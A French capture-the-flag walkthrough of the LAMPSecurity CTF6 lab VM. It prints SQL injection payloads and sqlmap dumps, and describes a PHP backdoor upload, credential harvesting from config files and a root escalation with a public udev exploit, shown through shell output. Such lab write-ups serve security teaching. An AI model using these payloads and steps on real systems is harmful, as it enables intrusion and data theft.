# Solution du CTF LAMPSecurity 6

Introduction
------------

[LAMPSecurity CTF6](http://vulnhub.com/entry/lampsecurity-ctf6,85/) est le sixième volet d'une série de CTFs qui a été créée par le blogueur *[MadIrish](http://www.madirish.net/)*.  

J'ai pris ce sixième CTF en cherchant totalement par hazard sur *VulnHub*.  

L'importation de l'image VMWare n'a posé aucun problème. J'ai sélectionné "migré" au lieu de "copié" ce qui permet de conserver certains paramètres (adresse MAC ?)  

Au passage, attention à ne pas ouvrir le PDF qui est présent dans l'archive car il contient la solution et le CTF perdrait son intérêt.  

Au début était le scan
----------------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-31 14:32 CEST
Nmap scan report for 192.168.1.95
Host is up (0.10s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 14:a9:f4:11:dc:2c:4e:0d:45:6c:99:11:22:29:03:bc (DSA)
|_  2048 45:58:6c:98:3e:97:2a:da:e2:b8:6a:84:d4:6a:be:26 (RSA)
80/tcp   open  http     Apache httpd 2.2.3 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: CTF 6 - Widgets Inc.
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            629/udp  status
|_  100024  1            632/tcp  status
443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: CTF 6 - Widgets Inc.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-06-02T15:13:30+00:00
|_Not valid after:  2010-06-02T15:13:30+00:00
|_ssl-date: 2014-05-30T17:11:15+00:00; -19h21m44s from local time.
3306/tcp open  mysql    MySQL 5.0.45
| mysql-info: 
|   Protocol: 53
|   Version: .0.45
|   Thread ID: 5
|   Capabilities flags: 41516
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, SupportsTransactions, SupportsCompression, Support41Auth, Speaks41ProtocolNew
|   Status: Autocommit
|_  Salt: 23FFoy44HM*(+@=TmHa.
MAC Address: 00:0C:29:32:79:F3 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

Les services ouverts sont pour le moins classiques mis à part qu'un administrateur éviterait d'exposer le MySQL et le RPC sur Internet.  

Le site "en clair" et celui sur HTTPS renvoient les même pages. Le HTTPS n'est pas vulnérable au bug *Heartbleed* (petit test histoire de, mais on en aurait probablement rien fait pour ce CTF).  

Dans les pages on trouve un lien vers /mail/ qui correspond à un *Roundcube* (un webmail dans la lignée de *Horde* et *SquirrelMail*).  

Dans les pages originales créées pour le site ou trouve un paramètre qui semble particulièrement réceptif à une possible injection SQL.  

Par exemple pour l'URL :

```plain
http://192.168.1.95/?id=3
```

on obtient un article titré "Praesent magna est".  

Si on rajoute un OR 1 :

```plain
http://192.168.1.95/?id=3%20or%201
```

alors tous les articles semblent retournés  

alors qu'avec un AND 1 :

```plain
http://192.168.1.95/?id=3%20and%201
```

on retrouve seulement le "Praesent magna est".  

pour terminer avec un AND 0 :

```plain
http://192.168.1.95/?id=3%20and%200
```

aucun article n'est renvoyé  

On lance tout de même *Wapiti* qui confirme la vulnérabilité et en trouve d'autres au passage :  

```plain
[+] Lancement du module sql
Injection MySQL dans http://192.168.1.95/?action=login via une injection dans le paramètre username
Evil request:
POST /?action=login HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/?action=login
Content-Type: application/x-www-form-urlencoded

username=%BF%27%22%28&password=letmein

Injection MySQL dans http://192.168.1.95/index.php?action=login via une injection dans le paramètre username
Evil request:
POST /index.php?action=login HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/index.php?action=login
Content-Type: application/x-www-form-urlencoded

username=%BF%27%22%28&password=letmein

[+] Lancement du module xss

[+] Lancement du module blindsql
Faille d'injection SQL en aveugle dans http://192.168.1.95/ via une injection dans le paramètre id
  Evil url: http://192.168.1.95/?id=sleep%287%29%231
Faille d'injection SQL en aveugle dans http://192.168.1.95/index.php via une injection dans le paramètre action
  Evil url: http://192.168.1.95/index.php?action=sleep%287%29%231
Faille d'injection SQL en aveugle dans http://192.168.1.95/index.php via une injection dans le paramètre id
  Evil url: http://192.168.1.95/index.php?id=sleep%287%29%231
Faille d'injection SQL en aveugle dans http://192.168.1.95/?action=sleep%287%29%231 via une injection dans le paramètre action
Evil request:
POST /?action=sleep%287%29%231 HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/?action=login
Content-Type: application/x-www-form-urlencoded

username=default&password=letmein

Faille d'injection SQL en aveugle dans http://192.168.1.95/?action=login via une injection dans le paramètre password
Evil request:
POST /?action=login HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/?action=login
Content-Type: application/x-www-form-urlencoded

username=default&password=sleep%287%29%231

Faille d'injection SQL en aveugle dans http://192.168.1.95/index.php?action=sleep%287%29%231 via une injection dans le paramètre action
Evil request:
POST /index.php?action=sleep%287%29%231 HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/index.php?action=login
Content-Type: application/x-www-form-urlencoded

username=default&password=letmein

Faille d'injection SQL en aveugle dans http://192.168.1.95/index.php?action=login via une injection dans le paramètre password
Evil request:
POST /index.php?action=login HTTP/1.1
Host: 192.168.1.95
Referer: http://192.168.1.95/index.php?action=login
Content-Type: application/x-www-form-urlencoded

username=default&password=sleep%287%29%231
```

Puis vint l'attaque
-------------------

On "fire up" un sqlmap comme d'habitude. Ce dernier nous permet de récupérer les informations suivantes concernant les pages faites-maison :  

```plain
current user:    'cms_user@%'
current database:    'cms'

[*] cms_user [1]:
    password hash: 2e0cfd856355b099
[*] root [2]:
    password hash: 6cbbdf9b35eb7db1
    password hash: NULL
```

L'option --dbs nous liste les bases de données existantes :  

```plain
[*] cms
[*] information_schema
[*] mysql
[*] roundcube
[*] test
```

Plus d'informations sur la base CMS avec *-D cms --tables* :  

```plain
Database: cms
[3 tables]
+-------+
| user  |
| event |
| log   |
+-------+
```

Et enfin le dump de la table user (*-D cms -T user --dump*) :  

```plain
Database: cms
Table: user
[1 entry]
+---------+---------------+----------------------------------+
| user_id | user_username | user_password                    |
+---------+---------------+----------------------------------+
| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 |
+---------+---------------+----------------------------------+
```

Le hash MD5 ne fait pas long feu sur [MD5RDB](http://md5.noisette.ch/) (adminpass).  

L'exploration de la base *Roundcube* est en revanche moins intéressante. On s'en sort avec un utilisateur *john@localhost* dont l'ID est 1.  

Les mots de passe ne sont pas stockés en base, roundcube devant dialoguer directement avec l'IMAP, POP3 voir autre chose.  

Une fois connecté sur le CMS maison avec les identifiants *admin / adminpass*, on trouve vite fait bien fait un moyen d'uploader une backdoor PHP (dans *"New event"*).  

L'extension .php passe sans problème. On en profite pour uploader une backdoor plus évoluée.  

```plain
sh-3.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-3.2$ uname -a
Linux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux
sh-3.2$ cat /etc/*release*
cat: /etc/lsb-release.d: Is a directory
CentOS release 5.2 (Final)
```

Dans /var/www/html on trouve d'autres dossiers :

```plain
total 72
drwxr-xr-x 15 apache apache 4096 Jun 29  2009 .
drwxr-xr-x  7 root   root   4096 Jun 29  2009 ..
drwxrwsr-x  2 apache apache 4096 Jun 29  2009 actions
drwxr-sr-x  2 apache apache 4096 Jun 23  2009 conf
drwxrwsr-x  2 apache apache 4096 Jun 10  2009 css
drwxr-xr-x  2 apache apache 4096 Jun 29  2009 docs
drwxr-sr-x  2 apache apache 4096 May 30 14:02 files
drwxrwsr-x  2 apache apache 4096 Jun 22  2009 inc
-rw-rw-r--  1 apache apache 1930 Jun 24  2009 index.php
drwxrwsr-x  2 apache apache 4096 Jun 21  2009 js
drwxr-sr-x  2 apache apache 4096 Jun 22  2009 lib
drwxr-sr-x  2 apache apache 4096 Jun 23  2009 logs
lrwxrwxrwx  1 root   root     23 Jun 23  2009 mail -> roundcubemail-0.2-beta2
drwxr-xr-x 11 root   root   4096 Jun 23  2009 phpMyAdmin-3.0.0-all-languages
lrwxrwxrwx  1 root   root     30 Jun 23  2009 phpmyadmin -> phpMyAdmin-3.0.0-all-languages
drwxr-xr-x 10 apache apache 4096 Dec 16  2008 roundcubemail-0.2-beta2
drwxrwsr-x  2 apache apache 4096 Jun 15  2009 sql
drwxr-sr-x  2 apache apache 4096 Jun 23  2009 template
```

Le fichier *conf/config.ini* contient les identifiants SQL pour le CMS :

```plain
;
; This is the configuration file
;
database_host   =       localhost
database_pass   =       45kkald?8laLKD
database_user   =       cms_user
database_db     =       cms
```

Et dans *roundcubemail-0.2-beta2/config/db.inc.php* :

```plain
$rcmail_config['db_dsnw'] = 'mysql://root:mysqlpass@localhost/roundcube';
```

On découvre plusieurs utilisateurs Unix sur le système :

```plain
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
avahi:x:70:70:Avahi daemon:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
distcache:x:94:94:Distcache:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
pcap:x:77:77::/var/arpwatch:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin
john:x:500:500::/home/john:/bin/bash
linda:x:501:501::/home/linda:/bin/bash
fred:x:502:502::/home/fred:/bin/bash
molly:x:503:503::/home/molly:/bin/bash
toby:x:504:504::/home/toby:/bin/bash
```

Dans le dossier logs on trouve un .htaccess (admin:mFiIPQcxSFjRA) qui se casse rapidement :  

```plain
Loaded 1 password hash (Traditional DES [128/128 BS AVX-16])
adminpas         (admin)
```

Et finalement l'accès root
--------------------------

Malgré tout ça on ne trouve rien qui nous permet de passer root. On va donc fouiller dans les exploits existants.  

Le kernel est trop récent pour les failles ptrace et trop à jour pour vmsplice. Il est aussi trop vieux pour certaines failles qui touchent les 2.6.3\* et 3.\*.  

Finalement il fallait insister sur [l'exploit pour UDEV de Kingcope](http://www.exploit-db.com/exploits/8478/). On passe en argument le PID du udev (obtenu via ps) :  

```plain
sh-3.2$ ./udev.sh 569
suid.c: In function 'main':
suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
sh-3.2# id
uid=0(root) gid=0(root) groups=48(apache)
```

Conclusion
----------

Un CTF sans grande difficulté malheureusement très proche des intrusions qui se font sur des milliers de serveurs chaque jour.

*Published June 03 2014 at 18:34*